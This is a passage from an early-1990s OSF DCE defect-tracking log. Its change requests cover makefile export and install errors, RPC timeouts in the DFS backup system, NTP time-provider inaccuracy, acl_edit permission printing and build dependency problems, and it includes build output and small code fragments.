Alright, if you remove the EXPDIR from threads/Makefile you get the ouput:

# build export_all
relative path: ./threads
cd ../../obj/rios/threads
exec make MAKEFILE_PASS=AUTOGEN  _SUBMAKE_=_IS_SUBMAKE_  export_all
Export all targets = 
exec make MAKEFILE_PASS=FIRST  _SUBMAKE_=_IS_SUBMAKE_  export_all
*** makefile error: Cannot export cma.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_config.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_px.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export pthread_exc.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cmalib_crtlx.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_sigwait.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_errno.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export exc_handling.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export threadmsg.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_defs.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_queue.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_assert.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_kernel.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_defer.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_host.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_ux.h because EXPDIR is not defined in Makefile.
*** makefile error: Cannot export cma_stdio.h because EXPDIR is not defined in Makefile.
Export all targets = 
exec make MAKEFILE_PASS=THIRD  _SUBMAKE_=_IS_SUBMAKE_  export_all
Export all targets = 
Export all targets = 


And if you remove the IDIR from threads/Makefile you get the output:

# build install_all
relative path: ./threads
cd ../../obj/rios/threads
*** makefile error: The target cma.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_config.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_px.h could not be installed because the variable IDIR is not set.
*** makefile error: The target pthread.h could not be installed because the variable IDIR is not set.
*** makefile error: The target pthread_exc.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cmalib_crtlx.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_sigwait.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_errno.h could not be installed because the variable IDIR is not set.
*** makefile error: The target exc_handling.h could not be installed because the variable IDIR is not set.
*** makefile error: The target threadmsg.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_defs.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_queue.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_assert.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_kernel.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_defer.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_host.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_ux.h could not be installed because the variable IDIR is not set.
*** makefile error: The target cma_stdio.h could not be installed because the variable IDIR is not set.
*** makefile error: The target dcethd.cat could not be installed because the variable IDIR is not set.



EXPDIR and IDIR will no longer be dependent on one another.

I have the code for this.  If this is what you want then I'll start testing it.

Note that this does not stop make processing and chances are that this will
cause errors later on in the build (at least for export pass).

[7/13/94 public]
It's a beautiful thing.

re: build errors.  That's okay; exporting headers to _MISSING_EXPDIR_ would
have resulted in failures later on, as well.  On the whole, that's the
right thing to happen.

[9/12/94 public]
I was wrong.  After testing my changes to osf.std.mk I have found that 
there are cases where it will incorrectly report   <target>_EXPDIR as missing 
the EXPDIR definition.  The output from my changes looks great, but is 
sometimes incorrect.  Also, considering the number of targets that we export, 
I'm wondering if it makes sense to add this kind of overhead to the builds.  
Checking each export target for _MISSING_EXPDIR_ may be a very small hit on
performance, but, we have so many things already in these makefiles
that slow down performance.  Do we need another?

The original request that missing EXPDIR definitions default to 
_MISSING_EXPDIR_ is the right way to go.  The change is quick and
simple and has no performance hits.

[9/19/94 public]
Defer to dce1.2.



CR Number                     : 9708
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : systest
Short Description             : add rgy verify to dfs.read_write_all
Reported Date                 : 1/10/94
Found in Baseline             : 1.0.3a
Found Date                    : 1/10/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/10/94 public]
Currently, the dfs.read_write_all test relies on the tester
having read the README and having updated the registry such
that the max cert lifetime >= default cert lifetime >= -t argument to test.

However, it would be better if the test verified early in its processing
that max cert lifetime >= -t argument to test and if so, established the
default cert lifetime for the test principals >= -t argument. This way,
the default for all principals would not have to be maxed.

The test would have to be able to set the default cert lifetimes for
new as well as existing test principals (ie. if SETUP_RGY_ACCOUNTS=FALSE).



CR Number                     : 9703
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : ufsops
Short Description             : bogus calculation in ag_ufsStat()
Reported Date                 : 1/7/94
Found in Baseline             : 1.0.3a
Found Date                    : 1/7/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/7/94 public]
Excerpt from request to submit:

> Fix:  The problem is that the default calculation for availblks 
> in ag_ufsStat() looks bogus.  Whenever a new DFS port is 
> completed, it gets this bogus calculation, unless a platform
> or feature ifdef is included.  As it turns out, the RIOS also ends 
> up using this apparently bogus calculation, but I believe it is 
> benign because the RIOS apparently doesn't reserve blocks.  If 
> reserved blocks is zero, the bogus calculation works.  I'm submitting 
> this fix, and I'll open a low priority enhancement against the 
> RIOS to have someone at IBM figure out if all the platform ifdefs 
> can be removed and have the RIOS use the same (I believe correct) 
> calculation as all the other platforms.
>



CR Number                     : 9661
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : 
Short Description             : some dce bindings need better management
Reported Date                 : 12/28/93
Found in Baseline             : 1.0.3
Found Date                    : 12/28/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/28/93 public]

There are certain cds objects which are created at config time
which contain ip addresses of servers.   When the ip address
of a machine changes, one has to first find all of these and
then manually unexport them and then re-export them with the
new ip address.  It would be nice if the servers associated
with these would check upon restart that these bindings are
accurate, thus making the process a little more automatic.

This is a list of the offending objects:

/.:/hosts/<machine>/self  
/.:/hosts/<machine>/cds-server  
/.:/hosts/<machine>/cds-clerk


There are probably more but I don't know what they are
yet.

This is very painful to have to manually find all of these
and then go through the unexport/export process to fix them.
I'd like to see this require less manual intervention.

[12/29/93 public]
Good point.  I think this falls more under the 1.1 namespace work being
done by Dick and Rajendra, so I made Dick the responsible engineer and put
Rajendra on the CC list.  (Should I have put this into the cfg component?)

[01/14/94 public]
Nothing needs to be done to RPC under this bug.

[01/17/94 public]
Each component responsible for the namespace entries that need to be
updated when a cell is changed must be modified to update the entries
automatically.

On boot (or upon request), CDS, gda, dced, secd, sec_clientd, dfs
daemons, and GDS, must export  the binding information to the namespace
and/or appropriate config files.

dce_config must be modified to reflect the fact that the namespace entries
and config files will be maintained automatically by the respective
daemons. 

OT reports should be entered for each of the above mentioned components to
reflect the need for changes described here.

[8/12/94 public]
Certain progress was made for this in 1.1 under individual component
defects.  However dce_config is not going to be srtipped of its
rpccp and cdscp commands.
Canceled.

[8/12/94 public]
Well at least not for 1.1, maybe in 1.2...

[8/12/94 public]
Well, certainly not with *MY* name on it.
This should be canceled.  Whats done is done, and this
is such a non-specific thing as to be a useless OT.

[08/13/94 public]
There is benefit in having an OT that tracks "issues" as well as detailed
things like compile-time errors.



CR Number                     : 9644
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : bld
Subcomponent Name             : 
Short Description             : can't clobber .o's
Reported Date                 : 12/22/93
Found in Baseline             : 1.1
Found Date                    : 12/22/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/22/93 public]
This CR is a place holder so if we have nothing else to do, maybe we could
do this:

> Isn't one of these supposed to work?
> 
>   absolut admin/dsh$ build clobber_main.o    
>   relative path: ./admin/dsh.
>   cd ../../../obj/hp800/admin/dsh
>   make: don't know how to make clobber_main.o. Stop
>   
>   absolut admin/dsh$ build rmtarget_main.o
>   relative path: ./admin/dsh.
>   cd ../../../obj/hp800/admin/dsh
>   make: don't know how to make rmtarget_main.o. Stop
>   
>   absolut admin/dsh$ build clean_main.o   
>   relative path: ./admin/dsh.
>   cd ../../../obj/hp800/admin/dsh
>   make: don't know how to make clean_main.o. Stop> 
>
> I have a main.o in my object tree that I want to get rid of,
> and I don't have a main.c in my src tree (I just submitted
> it and am getting it from the backing tree).  I had tried to
> touch main.c to change the times to rebuild a program and
> inadvertently created an empty main.c in my src tree, when I
> tried a build a bad main.o got created in the obj tree with
> of course a later timestamp than the main.c in the backing
> tree.  So I need to remove the main.o, and I thought one of
> these commands would do it, but they didn't.  I went in a
> deleted the main.o by hand, so this certainly isn't holding
> me up, but isn't it supposed to work?

The answer is that the common makefiles say that for this to work, main.o
must be set in $OBJECTS.  In this particular case I could change the
Makefile to say OBJECTS = $dcecp_OFILES, but that is clutter and only works
in one directory.  The better solution would be if the common makefiles
were changed so that OFILES was checked for the target as well.

[1/13/94 public]

This is an enhancement request.
Assigning to Mario Moreira.

[7/1/94 public ]
reassigned to Ron Rizzo

[7/1/94 public ]
CR was listed with "ron" as responsble engr.
changed to "rrizzo".



CR Number                     : 9580
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : rpc runtime
Short Description             : Rpc gives communication failure despite success of call
Reported Date                 : 12/7/93
Found in Baseline             : 1.0.2
Found Date                    : 12/7/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Status               : open

[12/7/93 public]
There seems to be a problem in the RPC runtime in which a call
goes through, but the client gets an RPC communication failure. 
This happens very reproducibly in the dfs backup system, when 
butc does a BUDB_UseTape() call to the bakserver. The butc gets
back a communication failure despite the fact that the call
goes through succesfully to the bakserver. butc repeats
the call and as a result, the backup system has two tapes
for the same dump with the same name, and this causes problems
later on. 
I have an RPC log (with RPC_DEBUG turned on) available that demonstrates
the problem.
 
Added field Transarc Deltas with value `' 
Added field Transarc Status with value `open'

[12/7/93 public]

Assumptions (based on AFS 3 admin experience) here, since I don't have time
to read the whole backup system source code:
 1) the "bakserver" is a database server for the backup process.
 2) "butc" is the process which actually reads & writes to the tape device.

My guess (w/o seeing the log) is that one thread of the butc invoked a
"slow" tape operation while a different thread was doing the remote call.
Because you're not running on an OS with kernel threads, the whole process
was blocked for ~30 seconds while a tape drive did something "interesting"
like a rewind or filemark write. (from experience, I know these take a
*long* time on helical-scan devices like the exabyte 8mm drives..).
Unfortunately, UNIX is of the (mistaken) opinion that tape drives are
"fast" devices, so setting up non-blocking I/O on the tape is not
effective.

RPC was never expected to operate in an environment where the whole process
can be blocked for a long time..  Once it came back from never-never land,
the rpc timer thread ran before the listener thread, and the calls in
progress were marked as timed out before the listener thread had a chance
to read the data presumably waiting on the socket.

There are a couple of options for how to fix it:
 1) fork off a subprocess to do "slow" tape operations like rewind or
close; you can always do a non-process-blocking wait for the subprocess to
complete.
 2) fix the wire interface to be idempotent (by adding a "tape uuid" or
some such) or otherwise cause the bakserver to detect and squish
duplicate tapes.
 3) convince all vendors to implement non-blocking I/O on tape devices
(1/2 :-) )



CR Number                     : 9579
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : Meet code cleanup requirement.
Reported Date                 : 12/7/93
Found in Baseline             : 1.1
Found Date                    : 12/7/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/7/93 public]
This a place holder for the code clean up work.

[9/20/94 public]

Code cleanup is complete but there is a small amount of SVC work 
to submit. It will go into unintegrated.



CR Number                     : 9562
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : 
Short Description             : provide flexibility in protocol sequence use of dce_config.
Reported Date                 : 11/30/93
Found in Baseline             : 1.0.2a
Found Date                    : 11/30/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/30/93 public]

dce_config hardwires the use of the ncadg_ip_udp protocol sequence. It
would be nice if this was made configurable (e.g. by consulting the
RPC_SUPPORTED_PROTSEQS environment variable).

[12/01/93 public]
I just want to point out that RPC_SUPPORTED_PROTSEQS is a debugging
and porting aide and was never intended to exist in a production
environment.  (Someone will now comment that they same can be said
for dce_config :-)

[12/03/93 public]
By the way, shouldn't dce_config automatically use all supported protocols
instead of just the one (ncadg_ip_udp)? 

For example, in ns_init() when exporting the "server DACL manager UUID,"
shouldn't it be exported for all valid protocols?  I would expect each
hardcoded reference to ncadg_ip_udp to be replaced with a loop through
each of the protocols (currently ncadg_ip_udp and ncacn_ip_tcp).
(The one exception is the DFS endpoint mapper, which only operates using 
ncadg_ip_udp.)

Then, just as a nicety for testers, you should allow them to override
the hardcoded list of supported protocols using the RPC_SUPPORTED_PROTSEQS
variable...



CR Number                     : 9516
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : various cases of
non-deterministic return values
Reported Date                 : 11/18/93
Found in Baseline             : 1.0.3
Found Date                    : 11/18/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/18/93 public]

Licensee reported:

"The following files have return statements coded without supplying
 explicit values for functions. These are cases in which the functions
 are typed non-void and whose return values ARE actually used in the code.

 client/rca/internal_binding.c  OSF rcsid 1.1.14.2
        rca_nsi_binding_import() as called from rca_site_bind()

 client/rca/secidmap.c          osf 1.0.2 release
        output_cache_line() as called from sec__id_check_cache()

 client/admin/passwd_import/passwd_import.c OSF rcsid 1.1.6.1
        add_pgo() as called from process_groups()

 server/sec_salvage_db/sec_svg_rec.c OSF rcsid 1.1.89.1
        construct_rep_rec() as called from construct_replicas()

"
I checked with our 1.0.3 code, these problems are still there.

[10/14/94 public]
Returning to it's natural state - had bumped the priority in an effort
to get it into the unintegrated tree.



CR Number                     : 9510
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : dts_ntp_provider
Short Description             : Bad use of NTP-provided information
Reported Date                 : 11/18/93
Found in Baseline             : 1.0.2
Found Date                    : 11/18/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : 

[11/18/93 public]
The code in dts_ntp_provider.c does not handle its incoming NTP packet
correctly.  There are two flaws:
	- it uses the time that the NTP server received the query packet, not
	  the time that the NTP receiver transmitted the response; and
	- it uses the inaccuracy figure that the NTP server reports for
	  itself, not the inaccuracy that it should compute based on the
	  communication time.
 
dts_ntp_provider.c correctly determines the four timestamps for the NTP
transaction: (t1) when the client sent the request, (t2) when the server
received the request, (t3) when the server sent the reply, (t4) when the
client received the reply.  It also correctly uses the NTP server's
``distance'' (time distance from time source) in computing the DTS
inaccuracy.
 
The two flaws could be ameliorated by the following:
	- using (t3) rather than (t2) as the basis for the reported time,
	  since that must necessarily be closer to the time that will be
	  reported;
	- adding ((t4-t1) - (t3-t2)) to the inaccuracy figure, since that
	  represents the time that the packet was in transit, and
	  the client (dts_ntp_provider) cannot tell what proportion of the
	  transit time was consumed by the request packet vs. that consumed
	  by the reply packet.
 
It is conceivable that dts_ntp_provider could choose to report a time like
the following:
	define delay=((t4-t1) - (t3-t2));
	when the packet was received (t4), the NTP server's time was
	somewhere in the interval [(t3-delay), t3];
	define the DTS representation of this as (t3-(delay/2)) with
	an inaccuracy of (delay/2), except then you can add in the server's
	synchronization distance, giving ((delay/2) + distance) for the
	DTS inaccuracy.
 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'
Changed Interest List CC from `cfe@transarc.com, jdp@transarc.com' to 
 `cfe@transarc.com, jdp@transarc.com, dce-ot-dfs'



CR Number                     : 9505
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : thr
Subcomponent Name             : 
Short Description             : code needlessly uses floating 
point internally
Reported Date                 : 11/17/93
Found in Baseline             : 1.0.3
Found Date                    : 11/17/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/17/93 public]
The cma code uses floating point to represent time intervals internally. 
cma_delay and cma_time_get_expiration take cma_t_interval, which is typed
to float, as an argument. Near as I can tell both of these come down to 
cma__interval_to_time which uses the float representation for a VAX call
only. For our platforms it casts the float to long to set values in a
timespec structure. Remove this floating code. There is no real need for 
it and it causes problems for very small client machines which may not
have floating point capabilities.



CR Number                     : 9501
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : make failure behavior of rpc_server_init() more robust.
Reported Date                 : 11/17/93
Found in Baseline             : 1.0.2
Found Date                    : 11/17/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : directory/cds/library/rpcserver.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/17/93 public]

The rpc_server_init() routine in cds/library/rpcserver.c calls
rpc_ep_resolve_binding() for each partially bound server handle. If any of
these calls fail, rpc_server_init() fails rather then simply try the next
handle. In the case of multiple network interfaces it seems reasonable to
expect the system to come up in a degraded mode as long as some path to
rpcd is known (e.g. only one of several network interfaces is down).



CR Number                     : 9499
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 7031
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : intercell cdscp operation which succeeds while unathenticated may fail when authenticated
Reported Date                 : 11/17/93
Found in Baseline             : 1.0.3
Found Date                    : 11/17/93
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/17/93 public]

Received: by inet-gw-2.pa.dec.com; id AA26334; Tue, 16 Nov 93 14:53:46
-0800
Received: by us1rmc.bb.dec.com; id AA25244; Tue, 16 Nov 93 17:31:02 -0500
From: mccann@tuxedo.enet.dec.com
Message-Id: <9311162231.AA25244@us1rmc.bb.dec.com>
Received: from tuxedo.enet; by us1rmc.enet; Tue, 16 Nov 93 17:52:57 EST
Date: Tue, 16 Nov 93 17:52:57 EST
To: dce-tech@osf.org
Cc: mccann@tuxedo.enet.dec.com
Apparently-To: dce-tech@osf.org
Subject: inter-cell access

As an unauthenticated user you can view the namespace of another cell
that has allowed unauthenticated read access to its entries as long
as the GDA can find the cell.

Now if you dce_login and try to view the same foreign cell as above
but the 2 cells have not cross-registered (using rgy_edit cell),
you get 'register object not found'.

There has been some here discussion about this behavior.  People don't
like it.  


Current ideas:
1. Because there is no trust relationship between the two cells,
   the user is unauthenticated to the foreign cell.

2. Applications (cdscp in particular) should make unauthenticated requests
   after seeing 'registry object not found' errors.  It could then let
   the user know.

3. The CDS child could do the same, but then the user isn't aware
   of what just happened.


What's wrong with this picture??

janet mccann



CR Number                     : 9491
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : acl_edit
Short Description             : tokens not used by acl_edit yet.
Reported Date                 : 11/15/93
Found in Baseline             : 1.0.2
Found Date                    : 11/15/93
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/15/93 public]
  Mike Young has reported the following shortcomings in the ACL support
layer. This is his report:
   ------------------------------------------------------------------
The acl_edit program ignores the "tokenize" value returned
by an ACL manager's rdacl_get_printstring function.  This
value is supposed to indicate whether the set of permissions
contains overlaps or combinations.  The intention is for
tools to look for combinations and use them instead of the
individual bits.  The acl_edit program does not -- it prints
anything that matches at all.  In the case of overlaps (aliases),
this is merely annoying.  In the case of real combinations,
the code is just plain wrong -- it can overstate permissions.
It looks like fixing the deif_permset_output function in "deif.c"
would do it.  Something like this would work (after making tokenize a
global like sec_acl_printstrings):
    if (tokenize) {
        int i;
        for (i = num_printstrings; --i >= 0; )
            if ((sec_acl_printstrings[i].permissions & perms) ==
                sec_acl_printstrings[i].permissions) {
                printf("%s",sec_acl_printstrings[i].printstring);
                perms &= ~sec_acl_printstrings[i].permissions;
            }
    } else {
        /* old deif_permset_output implementation */
    }
[haven't tested this code... it is merely a rough example.]
According to the commentary in "rdaclif.idl", combinations should
appear at the end of the list, so a backwards traversal appears to be
in order.  My code would cause the bits to come out in reverse order
compared to how it does things now, but since it does it wrong now,
who cares?  Reversing the list or printing "-" for unambigiuous
missing bits would take just a little more code if it really mattered.
The code also assumes that there are only 32 permission strings
for a given ACL, which is not correct in the presence of combinations
or aliases.
It also ignores a number of other features described in the rdaclif
interface, like chaining, but those aren't useful.  Handling aliases
and combinations most definitely IS useful.
I noticed this misfeature while experimenting with an RQS server
that has two names for the same permission bit.  I wanted to have the
printed entries contain just one of the two aliases, so I set
the "tokenize" return parameter to TRUE.  Alas, it had no effect.
.... I realize that DCE 1.1
will have new ACL management tools, but it really should be easy to
fix acl_edit.  It wouldn't surprise me if the DCE 1.1 tools will
inherit the same problem, and that would be very bad.

[11/15/93 public]
This is one of several things available in the architecture that acl_edit
does not make use of yet (the others being polymorphic types via multiple
ACL managers and >32 permission bits via chained ACL managers).  This CR has
been changed from 'def' to 'enh'.



CR Number                     : 9490
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : bld
Subcomponent Name             : Build
Short Description             : Compile phase still uses -L
and -l for -pic-extern
Reported Date                 : 11/15/93
Found in Baseline             : 1.0.3
Found Date                    : 11/15/93
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/15/93 public]
Historically, building with -pic-lib on the OSF/1 platforms required the
inclusion of the -L<path> and -l<lib> options on the compile line. With
the advent of -pic-extern, this is no longer needed. A small change to
lbe/mk/osf.std.mk will remove these unneded options.

[ninja]:/usr/sandbox/dcecp/src/lbe/mk> diff osf.std.mk
/dce1.1/lbe/mk/osf.std.mk
522c522
<       ${_CC_NOSTDINC_} ${_GENINC_} ${_CC_INCDIRS_}
---
>       ${_CC_NOSTDINC_} ${_GENINC_} ${_CC_INCDIRS_} ${_CC_PICLIB_}

[1/13/94 public]

Assigned to Ron Rizzo.

[1/13/94 public]
Yes.  Note that the compile lines should change from -pic-lib to
-pic-extern even though in recent versions they do the same thing.



CR Number                     : 9484
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : 
Short Description             : sams blding process
interdependcies not evaluated properly
Reported Date                 : 11/12/93
Found in Baseline             : 1.1
Found Date                    : 11/12/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/12/93 public]

When building a component that is dependant on a changed sams file, the
sams includes and objects are rebuilt correctly but the components 
objects that are dependant on the sams include files are not rebuilt. 

The workaround is to delete all of the objects and rebuild the entire 
component.

[11/12/93 public]
This is no different, say, from #include's of IDL-generated header
files.  Or, in fact, putting .h dependencies in our Makefiles.
I believe there is an open CR on this, so this should be cancelled.
For what it's worth, one school of thought says that you optimize the
common case (build from scratch) and don't slow down make by putting
in .h dependencies.

[11/12/93 public]
There is a little more detail that Kevin didn't enter in yet.  Our Makefile
has the sams generated .h files listed in HFILES and of course the .o's are
in OFILES.  Build should be tracked this dependency and rebuilt all the
.o's listed in OFILES.

This is not a makedepend issue.  With the size of DCE I'm not sure that the
common case is build from scratch, but I see the argument (and don't want
to get into it :-).  This also relates to our "conventions" for makefiles
that we should be telling the providers about how to put rules for sams
files in the Makefiles.  We thought we had the method down, but it doesn't
seem to work.

Since we added the rule explicitly with HFILES, it might not be related to
the fact that it's a SAMSFILE at all, but then again...

I think Kevin will add the test case to this CR soon...

[11/15/93 public]

Here is a snippet of the Makefile which sets the HFILES dependencies for
sams. I have also added explicit dependencies in the following. 
The explicit dependencies work fine  for all cases but the implicit
HFILES dependency does not work in any case. This is not only for the 
sams files, that are generated, but also for any other case I have tested. 
For instance, in the HFILES line described below the file dcecp.h can 
be modified and no file is built during the build process. This is a
problem. It does not, however, appear to be isolated to SAMSFILE. 


SAMSFILES		= dcp.sams
SAMIDL_INCLUDES 	= dcedcpsvc.h dcedcpmsg.h dcedcpmac.h
SAMS_TARGETS    	= dcedcpsvc.h dcedcpmsg.h dcedcpmac.h \
                	  dcedcpsvc.c dcedcpmsg.c dcedcp.cat

# what we are building
ILIST           	= dcedcp.cat
dcedcp.cat_IDIR 	= /nls/msg/en_US.ASCII/

HFILES			= dcedcpmsg.h dcedcpmac.h dcedcpsvc.h dcecp.h
OFILES			= main.o commands.o parseargv.o dcecp_login.o \
		  	  dcedcpsvc.o dcedcpmsg.o rpccp.o rgy.o \
		  	  ${CDS_OFILES} ${DTS_OFILES}
PROGRAMS		= dcecp

.include <${RULES_MK}>

main.o:			dcecp_login.h
commands.o:		dcecp_login.h rpccp.h cdscp.h dts_proto.h rgy.h
dcecp_login.o:		dcecp_login.h
rpccp.o:		rpccp.h
${CDS_OFILES}: 		cdscp.h cdscp_attr.h
${DTS_OFILES}:		dts.h dts_proto.h dcecp_login.h dtssts.h
dts_arith.c:		../../../src/time/common/arith.c
			$(CP) ${../../../src/time/common/arith.c:P} dts_arith.c 
rgy.o:			rgy.h

[11/14/93/public]
Just for the heck of it, I stuck the following makefile in a sandbox:

Makefile:
  PROGRAMS = xx

  HFILES= xx.h tt.h yy.h

  .include <${RULES_MK}>

Where xx.c is a "hello world" program, and xx.h, tt.h and yy.h are empty
files.  I get the following results:

mhickey@darkman[wkon-dce103](351)% build
relative path: ./test/systest/directory/gds/gds_xds_str_001
cd ../../../../../../obj/hp800/test/systest/directory/gds/gds_xds_str_001
exec make MAKEFILE_PASS=FIRST  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=FIRSTA  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=FIRSTB  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=THIRD  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=BASIC  _SUBMAKE_=_IS_SUBMAKE_  build_all
c89 -c    -D_SHARED_LIBRARIES    -D__hppa -Dhp9000s800 -Dhp9000s700
-D__hp9000s800 -D__hp9000s700 -DHPUX -D__hpux -Dunix +DA1.0 -D_HPUX_SOURCE
 -I.
-I/users/mhickey/sb/dce103/src/test/systest/directory/gds/gds_xds_str_001
-I/users/mhickey/sb/dce103/src/test/systest/directory/gds/gds_xds_str_001
-I/project/dce/build/dce1.0.3/src/test/systest/directory/gds/gds_xds_str_001
